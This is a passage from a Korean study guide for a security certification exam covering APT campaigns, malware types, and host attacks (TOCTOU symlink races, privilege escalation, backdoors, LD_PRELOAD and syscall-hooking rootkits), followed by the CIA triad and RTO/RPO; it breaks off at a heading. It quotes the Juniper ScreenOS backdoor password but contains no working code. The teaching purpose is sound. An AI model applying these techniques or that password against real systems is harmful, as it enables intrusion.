- **내부자 포섭 / 탈취 계정**: 협력사 직원을 돈으로 매수하거나, 이미 유출된 비밀번호 DB에서 내부 직원 계정을 재사용해 우회 침투
- **악성코드**: 침투 이후 내부망 이동·데이터 수집을 위해 다양한 악성코드를 맞춤 배포

SolarWinds 사건(2020)은 미국 IT 관리 소프트웨어 기업 SolarWinds의 Orion 제품 업데이트 서버가 뚫려, 정상 업데이트에 악성코드가 실린 채 전 세계 약 1만 8천여 고객사로 배포된 대형 공급망 공격이다. 미 재무부·국무부·국토안보부 같은 정부 기관과 Microsoft 같은 기업이 피해를 입었고, 러시아 연계 APT29(Cozy Bear)의 소행으로 지목됐다.

APT 지문에 "시스템에 직접 침투하는 것뿐 아니라 표적 내부 직원들이 이용하는 다양한 단말을 대상으로 한다"는 문장이 나오면, 바로 이 다양한 침투 수단을 가리키는 것이다.

```mermaid
제목: 하나의 표적을 향해 6개 경로를 동시에 두드리는 APT
flowchart TB
  W("워터링 홀") --> T(("표적 기업<br>내부 확산"))
  S("스피어 피싱") --> T
  Z("제로데이") --> T
  C("탈취 계정") --> T
  I("내부자 포섭") --> T
  P("공급망 공격") --> T
```

#### 대표 사례

| 사례 | 배후 추정 | 무엇을 했나 |
|---|---|---|
| Stuxnet (2010) | 미국·이스라엘 | 이란 나탄즈 핵시설 원심분리기 파괴. Windows 제로데이 4개를 동시에 쓴 최초의 국가 단위 사이버 무기 |
| Lazarus (2014~) | 북한 연계 | 소니 픽처스 해킹(2014), 방글라데시 중앙은행 SWIFT 탈취(2016), 다수 암호화폐 거래소 공격 |
| APT28 (Fancy Bear) | 러시아 연계 | 2016년 미 대선 관련 이메일 유출 공격 |
| APT29 (Cozy Bear) | 러시아 연계 | 미국 국무부·DNC 해킹, SolarWinds 공급망 공격(2020) |

"APT + 숫자"라는 이름은 MITRE와 보안업계가 추적 중인 공격 그룹에 붙이는 식별자다. MITRE는 공격 그룹과 전술·기법을 분류하는 ATT&CK 프레임워크를 운영하는 미국의 비영리 보안 연구 기관이다. 국가 지원 그룹이 주로 APT를 쓰는 이유는 제로데이를 사거나 개발하는 데 막대한 자원이 들기 때문이다. 블랙마켓·버그바운티에서 건당 수억 원에 거래되고, 직접 개발하려면 수개월의 연구 인력이 필요하다.

#### 대응 전략
APT는 시그니처 기반 백신만으로는 못 막는다. 시그니처 기반 백신은 알려진 악성코드의 '지문' 패턴을 DB에 저장해 두고 일치하면 차단하는 전통적인 백신이라, 처음 나온 신종 악성코드는 탐지하지 못한다. 그래서 "이미 내부에 들어와 있다"고 가정하고 다층 방어를 설계해야 한다.

- **행위 기반 탐지(EDR)**: 알려진 시그니처가 없어도 권한 상승·비정상 네트워크 연결 같은 의심 행위 탐지. EDR(Endpoint Detection and Response)은 단말(PC·서버) 행위를 실시간 분석해 악성 행위를 탐지·대응하는 보안 솔루션
- **네트워크 세그먼테이션(Network Segmentation)**: 내부망을 여러 구역으로 나눠 횡적 이동(Lateral Movement, 침해된 시스템에서 같은 내부망의 다른 시스템으로 침투 범위를 넓히는 행위)을 차단하고 침해 범위 제한
- **제로트러스트(Zero Trust)**: "내부는 안전하다"는 가정을 버리고 모든 접근을 매번 검증. 예를 들어 파일 서버에 접속할 때마다 사용자·기기·시간대를 다시 확인하고, 의심스러운 접근에는 MFA 추가 요구
- **위협 인텔리전스(Threat Intelligence)**: 전 세계 공격 정보를 수집·분석해 공유하는 체계. APT 그룹의 전술·기법·절차(TTP, Tactics, Techniques and Procedures)를 공유받아 선제 탐지
- **패치 관리와 최소 권한 원칙**: 제로데이가 아닌 알려진 취약점이 침투 경로가 되지 않도록 기본기 유지

APT는 장기·은밀·복합 공격이라 '막는 것'보다 '빨리 탐지하고 격리하는 것'이 현실적이다. 그래서 EDR + 네트워크 세그먼테이션 + 제로트러스트를 'APT가 이미 들어와 있을 때 피해를 제한하는' 3종 세트로 묶어 기억한다.

#### 지문에서 APT를 알아보는 단서

- **표적**: "불특정 다수가 아닌 명확한 표적", "특정 조직·기업"
- **지속성**: "지속적인 정보 수집", "장기간 은밀히"
- **복합 기법**: "Zero-day 취약점, 악성코드 등 다양한 공격 기술"
- **4단계**: "침투, 검색, 수집, 유출의 4단계"
- **내부 단말**: "표적 내부 직원들이 이용하는 다양한 단말"

## 악성 코드 (바이러스·웜·트로이 목마)
출제: 25-1, 23-1
형태: 설명 3개 → 보기(한글)로 3개 구분, 또는 설명 3줄 → 하나

### 개념
악성 코드는 바이러스, 웜, 트로이 목마처럼 사용자 몰래 악의적인 일을 하는 프로그램이다. 대표 여섯 가지의 키워드를 먼저 표로 보면 이렇다.

| 용어 | 키워드 |
|---|---|
| 바이러스 | 프로그램 변형 감염, 자가 복제, 네트워크 자율 전파 안 함 |
| 웜 | 네트워크 자율 전파, 자가 복제, 이메일/공유 폴더/P2P 전파 |
| 트로이 목마 | 정상 프로그램 위장, 악성 루틴 포함, 자가 복제 안 함, 파일 감염 안 함 |
| 랜섬웨어 | 파일 암호화, 몸값 요구, 데이터 인질, 복구 불가능 |
| 스파이웨어 | 정보 수집, 개인정보 유출, 키로거, 사용자 모르게 설치 |
| 스캐어웨어 | 가짜 경고로 공포 유발, 사회공학, 가짜 백신·결제 유도 |

### 악성 코드 하나씩 보기

#### 1. 바이러스 (Virus)
**바이러스**는 사용자 컴퓨터(네트워크로 연결된 공유 컴퓨터 포함) 안의 프로그램이나 실행 가능한 부분을 변형해서 감염시키는 프로그램이다. 자신을 그대로 또는 변형된 형태로 복사하는데, 다른 네트워크의 다른 컴퓨터로 스스로 퍼지지는 않는다는 것이 가장 큰 특징이다.

- 원리: 프로그램이나 실행 가능한 부분을 변형해 감염
- 특징: 자신을 복사하거나 변형된 형태로 복사, 다른 네트워크로 자율 전파 안 함
- 대응책: 안티바이러스 프로그램 사용, 정기적인 시스템 스캔, 실행 파일 검증

바로 다음 웜과 가르는 기준은 하나다. 네트워크를 통해 퍼지지 않으면 바이러스, 퍼지면 웜(바이러스)이다.

#### 2. 웜 (Worm)
**웜**은 바이러스와 달리 독립된 프로그램으로 존재하고, 인터넷이나 네트워크를 통해 컴퓨터에서 컴퓨터로 스스로 퍼지는 악성 프로그램이다. 윈도우나 애플리케이션의 취약점을 이용해 이메일, 공유 폴더, P2P 프로그램 등으로 전파되며, 자가 복제와 네트워크를 통한 전파가 주요 특징이다.

- 원리: 독립적인 프로그램, 네트워크를 통해 자율 전파, 자가 복제로 확산
- 특징: 네트워크 연결을 통한 다른 컴퓨터로의 전파, 이메일·공유 폴더·P2P 프로그램을 통한 전파
- 대응책: 보안 패치 적용, 방화벽 설정, 안티바이러스 프로그램 사용

#### 3. 트로이 목마 (Trojan Horse)
**트로이 목마**는 정상 프로그램으로 위장하고 있지만 안에 숨겨진 악성 루틴이 있어서, 실행하면 악성 코드가 동작하는 프로그램이다. 여기서 악성 루틴은 악의적 행동을 하는 코드 조각이고, 루틴(Routine)은 특정 작업을 하려고 호출되는 코드의 일부를 말한다. 트로이 목마는 자가 복제를 하지 않고 다른 파일을 감염시키거나 변형하지도 않는다. 하지만 이것이 든 프로그램이 실행되는 순간 시스템 제어권을 공격자에게 넘겨준다.

- 원리: 정상 프로그램으로 위장해 사용자가 실행하도록 유도
- 특징: 자가 복제 안 함, 다른 파일 감염·변형 안 함, 실행 시 시스템 제어권 넘김
- 대응책: 신뢰할 수 있는 출처의 프로그램만 설치, 안티바이러스 프로그램 사용, 실행 파일 검증

#### 4. 랜섬웨어 (Ransomware)
**랜섬웨어**는 사용자의 파일을 암호화해 접근을 막은 다음, 복구해 주는 대가로 몸값을 요구하는 악성 프로그램이다. 암호화 키를 주는 대가로 금전을 요구한다는 것이 주요 특징이다.

- 원리: 파일을 암호화해 접근 차단 후 몸값 요구
- 특징: 파일 암호화, 데이터 인질, 복구 불가능, 몸값 요구
- 대응책: 정기적인 백업, 보안 패치 적용, 의심스러운 이메일/링크 주의, 안티바이러스 프로그램 사용

#### 5. 스파이웨어 (Spyware)
**스파이웨어**는 사용자 동의 없이 설치되어 개인정보나 기밀 정보를 모아 제3자에게 보내는 악성 프로그램이다. 사용자가 모르는 사이에 설치되어 키로거(Keylogger, 키보드 입력을 기록하는 프로그램이나 하드웨어 장치), 화면 캡처, 웹 브라우징 기록 수집 등으로 개인정보를 빼낸다.

- 원리: 사용자 모르게 설치되어 정보 수집 및 전송
- 특징: 정보 수집, 개인정보 유출, 키로거, 사용자 모르게 설치
- 대응책: 신뢰할 수 있는 출처의 프로그램만 설치, 안티스파이웨어 프로그램 사용, 정기적인 시스템 스캔, 의심스러운 프로그램 제거

#### 6. 스캐어웨어 (Scareware)
**스캐어웨어**는 "겁을 주다(scare)"라는 영어 단어에서 온 악성 소프트웨어다. 가짜 바이러스 경고나 시스템 문제 화면으로 사용자에게 공포·불안을 일으켜, 가짜 백신을 사거나 특정 행동을 하도록 조작한다. 기술적으로 침투하기보다 사회공학으로 사용자가 스스로 결제·설치하게 만든다는 점이 특징이다.

- 원리: 정상 보안 경고처럼 위장한 팝업으로 "감염되었습니다" 경고 → 가짜 백신 결제·설치 유도
- 특징: 공포·긴급함 자극, 실제 감염 여부와 무관하게 사용자를 속임. 결제 강요형은 일종의 랜섬웨어 변형으로 분류되기도 함
- 대응책: 운영체제·브라우저 정품 보안 기능 신뢰, 출처 불명 팝업의 결제·다운로드 거부, 정기적인 백신 점검

- 23-1: 자율 전파 / 정상 위장·비복제 / 감염·비자율 전파 → **웜 / 트로이 목마 / 바이러스**

## 시스템 공격 (레이스 컨디션·루트킷·백도어)
출제: 26-1, 24-1
형태: 설명 빈칸 → 보기(26-1 심볼릭 링크), 설명 5줄 → 보기 영문(24-1 Rootkit)

### 개념
이 묶음은 공격자가 호스트에 들어온 뒤에 하는 시스템(로컬) 공격을 다룬다. 레이스 컨디션과 심볼릭 링크 악용, 권한 상승, 백도어, 루트킷, 키로거까지 한 번에 본다.

### 공격 계열 한눈에 보기
"공격 유형" 문제를 풀 때는 먼저 어느 계열인지부터 판별한다. 크게 7개 계열로 나뉜다.

| 계열 | 공격 대상·특징 | 대표 공격 | 관련 묶음 |
|---|---|---|---|
| 네트워크 공격 | 트래픽·프로토콜 조작 | 스니핑, IP/ARP 스푸핑, 세션 하이재킹, 패스워드 크래킹 | 네트워크 공격 |
| 서비스 거부 공격 | 가용성 파괴 | SYN 플러딩, Smurf, LAND, Teardrop, Ping of Death | DoS 공격 |
| 사회공학 공격 | 사람의 심리 | 피싱, 파밍, 스미싱, Business SCAM | 사회공학·표적 공격·APT |
| 악성 코드 | 실행 가능한 악성 프로그램 | 바이러스, 웜, 트로이 목마, 랜섬웨어, 스파이웨어 | 악성 코드 |
| 시스템(호스트) 공격 | 호스트·프로세스·파일시스템 | 레이스 컨디션, 심볼릭 링크, 권한 상승, 백도어, 루트킷 | 이 묶음 |
| 소프트웨어 보안 취약점 | 프로그래밍 결함 | 버퍼 오버플로, 포맷 스트링, 정수 오버플로, 경로 조작 | SW 개발 보안 취약점 |
| 웹 공격 | 웹 요청·세션 또는 웹사이트·도메인 | SQL Injection, XSS, CSRF, 워터링 홀, 타이포스쿼팅 | 웹 공격 |

여기서 시스템 공격의 자리를 짚어 두자. 네트워크 공격·DoS 공격은 외부에서 '선' 위의 패킷을 다루는 원격 공격이다. 반면 시스템 공격은 이미 안에 발을 들인 공격자가 호스트 안에서 권한을 넓히고 지속성을 확보하는 로컬 공격이다. 경계의 위치가 다르다.

### 시스템 공격이란?
**시스템 공격(System Attack)** 또는 호스트 공격(Host Attack)이란 공격자가 표적 호스트에 접근 권한을 얻은 뒤 운영체제·파일시스템·프로세스 수준에서 하는 공격을 말한다. 주된 목적은 넷이다.

- **권한 상승**: 일반 사용자 → 관리자(root/Administrator)
- **지속성 확보**: 재부팅·패치 후에도 접근 유지 (백도어·루트킷)
- **정보 탈취**: 키 입력·저장 자격증명 수집 (키로거)
- **흔적 은폐**: 로그 삭제·프로세스 은폐

### 레이스 컨디션
**레이스 컨디션(Race Condition)**은 둘 이상의 프로세스·스레드가 공유 자원에 동시에 접근할 때, 접근 순서(타이밍)에 따라 결과가 달라지는 상황을 악용하는 공격이다. 정상 프로그램이 자원을 검사(check)한 시점과 사용(use)하는 시점 사이의 짧은 틈(race window)을 공격자가 비집고 들어가 자원을 바꿔치기한다. 이 패턴을 **TOCTOU(Time-Of-Check to Time-Of-Use) 레이스 컨디션**이라고 부른다.

전형적인 흐름은 이렇다.

1. 정상 프로그램이 `/tmp/work` 파일의 존재·소유자 검사 (check)
2. 검사 결과 "안전"으로 판단, 파일을 열어 쓰기 준비
3. 이 순간 공격자가 끼어들어 `/tmp/work`를 삭제하고 같은 이름의 심볼릭 링크를 `/etc/passwd`로 생성
4. 정상 프로그램이 원래 열려던 `/tmp/work`에 쓰기 실행 (use) → 실제로는 `/etc/passwd`에 쓰기 발생

```mermaid
제목: 검사한 순간과 사용하는 순간 사이, 그 짧은 틈에 표지판이 바뀐다
%% 폰: TB
flowchart LR
  A("① 검사(check)<br>/tmp/work 안전") --> B("② 공격자 끼어듦<br>/tmp/work 삭제 후<br>→ /etc/passwd 링크 생성") --> C("③ 사용(use)<br>/tmp/work에 쓰기<br>= /etc/passwd에 쓰기")
```

프로그램이 root 권한(setuid)을 갖고 있다면, 공격자는 이 한 번의 틈으로 시스템 파일을 마음대로 변조할 수 있다. setuid(Set User ID)는 리눅스/유닉스에서 실행 파일에 붙이는 특수 권한 비트다. 일반 사용자가 setuid 비트가 붙은 프로그램을 실행하면, 실행되는 동안에는 그 파일 소유자의 권한으로 동작한다. 소유자가 root이면 실행 중에는 root 권한을 갖는 셈이라, passwd(비밀번호 변경)처럼 일반 사용자가 root 영역(`/etc/shadow`)을 건드려야 하는 작업에 쓴다. 그런데 setuid 프로그램에 취약점이 있으면 일반 사용자가 root 권한을 빼앗는 통로가 되므로 권한 상승 공격의 단골 표적이다.

#### 심볼릭 링크 (Symbolic Link)
**심볼릭 링크(Symbolic Link, Soft Link)**는 다른 파일·디렉터리의 경로를 가리키는 작은 파일이다. 원본 경로가 지워지면 링크는 깨지지만(dangling), 다른 파일시스템·다른 디렉터리를 자유롭게 가리킬 수 있다. 이 유연함 때문에 공격자가 TOCTOU 공격에서 즐겨 쓴다. 레이스 컨디션 공격에서 공격자는 임시 파일 자리에 공격 대상 파일 경로(예: `/etc/passwd`)를 가리키는 심볼릭 링크를 만들어, 프로그램이 의도하지 않은 파일에 접근하게 만든다.

#### 심볼릭 링크와 하드 링크 비교
심볼릭 링크는 파일의 경로를 가리키고, 하드 링크는 같은 파일 실체(inode)를 가리킨다. 이 차이 때문에 파일시스템 경계를 넘을 수 있는지, 원본 이름을 지웠을 때 어떻게 되는지가 달라진다.

| 용어 | 정의 | 특징 |
|---|---|---|
| 심볼릭 링크 (Symbolic Link / Soft Link) | 다른 파일·디렉터리의 경로를 가리키는 작은 파일 | 파일시스템을 넘나들 수 있음, 원본 삭제 시 깨짐, TOCTOU 공격의 단골 도구 |
| 하드 링크 (Hard Link) | 같은 inode(파일 실체)를 가리키는 또 다른 이름 | 같은 파일시스템 안에서만 가능, 디렉터리 불가, 원본을 지워도 다른 링크가 있으면 데이터 유지 |

### 권한 상승
**권한 상승(Privilege Escalation)**은 낮은 권한의 사용자·프로세스가 더 높은 권한을 얻는 공격이다. 레이스 컨디션·버퍼 오버플로·커널 취약점 등이 수단이 된다.

| 유형 | 설명 |
|---|---|
| 수직적 권한 상승 (Vertical) | 일반 사용자 → 관리자(root) 권한 획득 |
| 수평적 권한 상승 (Horizontal) | 사용자 A의 데이터를 사용자 B가 접근 |

```mermaid
제목: 위로 올라가면 수직, 옆으로 넘어가면 수평
flowchart LR
  subgraph H["수평적 권한 상승 (Horizontal)"]
    direction LR
    HA("사용자 A") -->|"B의 서류 접근"| HB("사용자 B 데이터")
  end
  subgraph V["수직적 권한 상승 (Vertical)"]
    direction BT
    VU("일반 사용자") -->|"사다리"| VR("root 관리자")
  end
```

대표 수단은 넷이다.

- **setuid 프로그램 악용**: root 권한으로 실행되는 setuid 프로그램의 취약점으로 root 쉘 획득
- **커널 취약점**: 커널의 메모리 관리·시스템 콜 버그로 커널 모드 진입
- **SUDO 설정 오류**: sudoers 파일에서 특정 명령을 비밀번호 없이 실행하도록 허용한 경우
- **미패치 취약점**: 공개된 권한 상승 익스플로잇을 그대로 사용

대응책은 최소권한 원칙, 커널·애플리케이션 최신 패치, SUDO 설정 정기 점검, setuid 비트가 붙은 프로그램 목록 감사다.

### 백도어
**백도어(Backdoor)**는 "뒷문"이라는 뜻 그대로, 정상 인증을 우회해 시스템에 들어올 수 있게 공격자가 심어 둔 은밀한 통로다. 정문은 경비(인증)가 지키지만 뒷문으로는 인증 없이 드나든다.

- 원리: 비밀 계정·비밀 포트·트리거 명령을 심어, 공격자만 아는 방법으로 곧바로 관리자 쉘 진입
- 대응: 정기적인 무결성 검사(Tripwire·AIDE), 코드 리뷰, 네트워크 이상 트래픽 탐지

형태는 셋이다.

- **하드코딩된 마스터 비밀번호**: 정상 인증 로직 외에 개발자만 아는 별도 암호로도 통과되도록 소스에 심어 둔 경우. 예로 Juniper ScreenOS 백도어 사건(2015)이 있다. 네트워크 장비 회사 Juniper Networks의 방화벽·VPN 운영체제 ScreenOS에서, 특정 마스터 비밀번호(`<<< %s(un='%s') = %u`)만 넣으면 누구든 관리자 권한으로 SSH·Telnet 로그인이 되는 코드가 발견됐다. 정상 인증 로직과 따로 심어진 우회 통로였고, 누가 언제 심었는지 끝내 밝혀지지 않아 국가 기관 개입설이 나왔다. 하드코딩된 마스터 비밀번호가 곧바로 백도어로 분류되는 대표 사례다.
- **리버스 셸(Reverse Shell)**: 보통 셸은 공격자가 피해자에게 접속하지만, 리버스 셸은 피해자 쪽에 심어진 코드가 공격자 서버로 먼저 접속한다. 회사 방화벽은 보통 "외부→내부"로 들어오는 연결은 막아도 "내부→외부"로 나가는 연결은 허용하므로, 방향을 뒤집어 방화벽을 통과하는 것이다.
- **커널 백도어**: 운영체제의 핵심 코드인 커널 자체에 침투한 백도어. ps·netstat·ls 같은 사용자 도구도 결국 커널에 물어봐서 정보를 얻는데, 그 커널이 이미 거짓말하도록 변조돼 있으니 어떤 보안 도구로도 탐지하기가 매우 어렵다.

대응에 나온 Tripwire·AIDE는 둘 다 파일 무결성 모니터링(File Integrity Monitoring, FIM) 도구다. 서버의 주요 파일(`/etc/passwd`, `/bin`, `/usr/sbin` 등)의 해시값(SHA 등)을 처음 한 번 떠서 DB에 저장해 두고, 이후 정기적으로 다시 계산해 처음 값과 비교한다. 시스템 파일이 변조되면 해시가 달라지니 바로 알 수 있다. Tripwire는 1992년에 나온 원조 상용/오픈소스 도구이고, AIDE(Advanced Intrusion Detection Environment)는 Tripwire를 대체하려고 만든 GPL 오픈소스 대안이다. 백도어·루트킷이 시스템 파일을 바꿔도 해시는 속이기 어려워 탐지에 효과적인데, 기준이 되는 베이스라인 DB는 별도 저장소(읽기 전용 매체 등)에 둬야 공격자가 함께 변조하지 못한다.

### 루트킷

#### 루트킷 (Rootkit)
**루트킷(Rootkit)**은 공격자가 root 권한을 계속 유지하면서 자기 존재를 감추려고 쓰는 도구 묶음이다. 그래서 이름이 "root + kit"이다. ps·ls·netstat 결과를 변조해 자기 존재를 가린다.

```mermaid
제목: 출력은 정상으로 보이지만, 그 뒤에 root 공격자가 숨어 있다
flowchart RL
  R("루트킷<br>(root 권한, evil_proc)") -->|"출력 변조(hooking)"| O("ps · ls · netstat 출력<br>bash, ssh, sshd만 보임") --> U("관리자")
```

루트킷은 어느 계층에서 동작하느냐에 따라 유저 모드와 커널 모드로 나뉜다. CPU는 권한 수준을 가장 깊은 Ring 0(커널)부터 가장 얕은 Ring 3(사용자)까지 단계로 나누는데, 더 깊은 Ring에서 움직일수록 위·아래를 모두 속일 수 있어 탐지가 어렵다.

Ring 0~Ring 3은 x86 계열 CPU가 제공하는 보호 링(Protection Ring) 권한 단계다. 가장 깊은 Ring 0은 모든 메모리·하드웨어에 직접 접근하는 커널의 영역이고, 가장 얕은 Ring 3은 일반 응용 프로그램이 도는 영역이다. Ring 3 코드는 시스템 콜을 통해서만 Ring 0의 기능을 빌려 쓸 수 있고, 이 경계 덕분에 사용자 프로그램의 버그가 OS 전체를 망가뜨리지 못한다. 루트킷은 이 경계를 어디서 뚫느냐에 따라 유저 모드(Ring 3)와 커널 모드(Ring 0)로 나뉘고, 커널 모드일수록 탐지가 극도로 어려워진다.

#### 유저 모드 루트킷
응용 계층(Ring 3)에서 동작한다. 커널은 건드리지 않고 사용자 영역의 명령어·라이브러리만 변조해서 공격자의 흔적을 가린다.

- **바이너리 교체**: ps·ls·netstat·ifconfig·who 같은 표준 명령을 트로이 목마 버전으로 바꿔치기. 변조된 ps는 공격자 프로세스만 빼고 나머지는 그대로 출력
- **공유 라이브러리 후킹**: 리눅스의 `LD_PRELOAD`, 윈도우의 DLL 인젝션으로 `readdir()`·`open()` 같은 표준 라이브러리 함수 호출을 가로채 결과 위조
- 장점(공격자 입장): 만들기 쉬움, 일반 사용자 권한만으로도 일부 동작 가능
- 약점: 정상 바이너리·라이브러리와 해시값을 비교하면 변조가 바로 드러남. 외부에서 가져온 깨끗한 도구(예: 정적 컴파일된 busybox)로 점검하면 본모습 노출

`LD_PRELOAD`는 리눅스/유닉스의 동적 링커(ld.so)에 다른 라이브러리보다 먼저 적재할 공유 라이브러리 경로를 알려 주는 환경 변수다. 같은 이름의 함수가 있으면 `LD_PRELOAD`에 지정된 쪽이 먼저 호출된다. 원래는 디버깅이나 함수 가로채기 도구를 만드는 데 쓰지만, 공격자가 악성 라이브러리를 여기에 올려 두면 모든 프로그램의 `open()`·`readdir()` 호출을 가로채 결과를 위조할 수 있어 유저 모드 루트킷의 단골 기법이 된다.

대표 예는 t0rn, LRK(Linux Rootkit Kit) 시리즈로, 90년대 후반 유닉스 서버 침해의 단골이었다.

#### 커널 모드 루트킷
커널 계층(Ring 0)에 직접 침투해 운영체제 자체가 거짓말하게 만든다. 커널은 모든 프로세스·파일·네트워크를 관리하는 운영체제의 심장이라, 이 계층이 거짓말을 하면 그 위의 모든 도구가 속는다.

- **시스템 콜 후킹**: 리눅스 LKM(Loadable Kernel Module) 형태로 커널에 모듈을 끼워 넣고 시스템 콜 테이블(`sys_call_table`)의 함수 주소 변조. `getdents()`(파일 목록 조회) 자체가 공격자 파일을 빼고 반환하므로 ls를 변조할 필요조차 없음
- **SSDT 후킹**: 윈도우 커널의 시스템 서비스 디스패치 테이블(SSDT)을 변조해 `NtQuerySystemInformation` 같은 커널 API 결과 조작
- **DKOM(Direct Kernel Object Manipulation)**: 커널이 관리하는 프로세스 연결 리스트에서 공격자 프로세스 노드를 통째로 끊어, 커널 자체가 그 프로세스를 인식하지 못하게 함
- **진화형**: 부팅 단계의 부트로더·UEFI 펌웨어까지 감염시키는 부트킷(Bootkit)·UEFI 루트킷도 같은 계열. 디스크를 포맷해도 살아남음

LKM(Loadable Kernel Module)은 리눅스 커널을 다시 컴파일하지 않고도 실행 중인 커널에 끼웠다 뺐다 할 수 있는 코드 조각이다. 디바이스 드라이버, 파일시스템, 네트워크 프로토콜 등을 모듈로 만들어 insmod·modprobe 명령으로 적재한다. 합법적으로 아주 유용한 기능이지만, 공격자가 자기 모듈을 적재하면 커널의 함수 포인터·시스템 콜 테이블을 직접 손댈 수 있어 커널 모드 루트킷의 표준 통로가 된다.

대표 예는 Sony BMG XCP(2005년 음악 CD에 무단 설치되어 윈도우 커널을 변조한 사건)와 Stuxnet(이란 우라늄 농축 시설을 노린 산업 사이버 무기에 포함된 커널 모듈)이다.

두 모드의 공통점과 대응은 다음과 같다.

- 공통 특징: 일단 심어지면 정상 도구로는 존재 확인이 어려움
- 공통 대응: 부트타임 무결성 검사, Secure Boot, 커널 서명 검증(서명되지 않은 모듈 적재 차단), 오프라인 포렌식(디스크를 떼어 깨끗한 시스템에서 분석). 의심되면 완전 포맷 후 재설치가 가장 확실

Secure Boot는 UEFI 펌웨어가 PC를 켤 때 부트로더·커널·드라이버의 디지털 서명을 검증해서, 서명이 없거나 신뢰된 키로 서명되지 않았으면 부팅 자체를 멈추는 기능이다. 부트킷·UEFI 루트킷이 디스크에 박혀 있어도 서명 없는 변조 부트 코드는 실행조차 되지 않는다. Microsoft와 주요 리눅스 배포판은 자체 키로 부트로더에 서명해 Secure Boot 환경에서도 정상 부팅되게 운영한다.

루트킷은 악성 코드의 한 분류이기도 해서 바이러스·웜·트로이 목마와 함께 묶이기도 한다.

### 키로거
**키로거(Keylogger)**는 사용자의 키보드 입력을 몰래 기록하는 악성 프로그램 또는 하드웨어다. 입력한 비밀번호·카드번호·개인 메시지가 모두 노출된다.

| 유형 | 예 |
|---|---|
| 소프트웨어 키로거 | OS의 키 입력 후킹 API 사용, 브라우저 확장·악성 앱 형태 |
| 하드웨어 키로거 | PC와 키보드 사이에 끼우는 USB 어댑터 형태 장치 |

대응책은 가상 키보드(온라인 뱅킹 등), 2단계 인증(OTP)으로 비밀번호가 새도 접속 차단, 수상한 USB 장치 점검이다.

### 공통 대응책
시스템 공격 전반에 공통으로 적용하는 방어 원칙이다.

- **최소권한 원칙(Principle of Least Privilege)**: 프로그램·사용자에게 꼭 필요한 최소 권한만 부여
- **메모리 보호 기법**: DEP(Data Execution Prevention), ASLR(Address Space Layout Randomization), Stack Canary. 버퍼 오버플로·권한 상승 익스플로잇의 성공 확률 감소
- **무결성 모니터링**: 주요 시스템 파일(`/etc/passwd`·`/etc/shadow`·`/bin`)의 변경 탐지 (Tripwire, AIDE)
- **로그 감시**: 관리자 계정 로그인, setuid 프로그램 실행 같은 이상 행위를 SIEM으로 집중 분석
- **정기 패치**: 커널·애플리케이션을 항상 최신으로 유지해 공개 취약점 차단
- **EDR/HIDS**: 호스트 기반 침입 탐지 솔루션으로 파일·프로세스 행위 모니터링

## 보안 관리 (CIA·RTO/RPO·ISMS)
출제: 26-1, 22-1, 20-4, 20-2
형태: 한 줄 정의 → 영문 약자(ISMS·RTO), 설명 → 요소 이름(가용성)

### 개념
정보보호는 주제 하나가 아니라 여러 층위로 이루어져 있다. 아래 5축을 기억해 두면 문제가 어느 축을 묻는지 금방 판별할 수 있다. 이 묶음에서는 3요소·확장 속성·관리체계를 보고, 제품 평가 기준과 법·제도는 「보안 인증 제도·개인정보」 묶음에서 본다.

| 축 | 핵심 질문 | 대표 용어 |
|---|---|---|
| 3요소 (CIA) | 정보를 지킬 때 무엇을 지키는가? | 기밀성·무결성·가용성 |
| 확장 속성 | CIA 외에 추가로 보장할 것은? | 인증·부인방지·책임추적성 |
| 관리체계 | 조직 차원에서 어떻게 운영하는가? | ISMS, ISMS-P, ISO/IEC 27001 |
| 제품 평가 기준 | 보안 제품을 어떻게 신뢰할 수 있는가? | CC (Common Criteria), EAL |
| 법·제도 | 개인정보를 어떻게 법으로 보호하는가? | 개인정보보호법, GDPR, 가명화·익명화 |

### CIA
**CIA(Confidentiality·Integrity·Availability)**는 정보보호에서 가장 기본이 되는 3요소다. 세 요소의 영문 첫 글자를 따서 CIA라고 부른다.

| 요소 | 영문 | 의미 | 파괴되었을 때의 예 |
|---|---|---|---|
| 기밀성 | Confidentiality | 인가된 사용자만 정보에 접근 | 외부인이 고객 DB를 훔쳐봄 (유출) |
| 무결성 | Integrity | 정보가 변경·손상되지 않음 | 해커가 성적 데이터를 조작 (위변조) |
| 가용성 | Availability | 필요할 때 정보에 접근 가능 | DDoS로 서비스가 다운됨 (차단) |

파괴되는 모습으로 줄이면 이렇다.

- 기밀성 파괴: 몰래 본다
- 무결성 파괴: 몰래 바꾼다
- 가용성 파괴: 못 쓰게 한다

CIA 3요소는 정보보호 논의 전체의 출발점이다. 암호화는 기밀성을, 전자서명과 해시는 무결성을, 방화벽·백업·이중화는 가용성을 지키는 수단이다. 어떤 보안 기술이든 'CIA 중 무엇을 지키는가'로 분류할 수 있다.

### 확장 보안 속성
CIA만으로는 모자란 상황이 있어서 다음 속성을 추가로 요구한다.

| 속성 | 영문 | 의미 |
|---|---|---|
| 인증 | Authentication | "당신이 정말 그 사람이 맞는가?" 확인 (비밀번호·생체인증·OTP) |
| 부인방지 | Non-repudiation | 어떤 행위를 한 사람이 "나는 안 했다"고 부인하지 못하게 함 (전자서명) |
| 책임추적성 | Accountability | 누가 언제 무엇을 했는지 추적 가능 (감사 로그) |
| 신뢰성 | Reliability | 시스템이 일관되게 의도한 대로 동작 |

부인방지와 책임추적성은 비슷해 보이지만 방향이 다르다. 부인방지는 "당사자가 나중에 부인하는 것을 막는" 법적 보호 장치이고, 책임추적성은 "운영자가 누가 무엇을 했는지 뒤쫓는" 관리 목적이다.

### RTO와 RPO
장애·재해가 났을 때 얼마나 빨리 복구할지, 그리고 데이터 손실을 어디까지 받아들일지를 숫자로 정한 목표 지표가 **RTO**와 **RPO**다. CIA 3요소 중 가용성(Availability)을 운영 차원에서 숫자로 나타낸 셈이다.

| 지표 | 영문 | 측정 대상 | 한 줄 정리 |
|---|---|---|---|
| RTO | Recovery Time Objective | 시간 | 장애 발생 후 정상 가동까지 허용 시간 |
| RPO | Recovery Point Objective | 데이터 | 손실을 허용할 수 있는 데이터 양(시점) |

- RTO 예시: "전자상거래 시스템은 장애 발생 후 4시간 안에 복구해야 한다" → RTO = 4시간
- RPO 예시: "결제 DB는 1시간 분량 데이터까지만 손실을 허용한다" → RPO = 1시간 → 적어도 1시간 단위 백업·복제 필요

둘을 헷갈리지 않으려면 영문 가운데 글자를 보면 된다. RTO는 '얼마나 빨리 켤까?'를 묻는 시간(Time) 지표, RPO는 '데이터를 어디까지 잃어도 될까?'를 묻는 시점(Point) 지표다.

#### BCP·DRP와의 관계
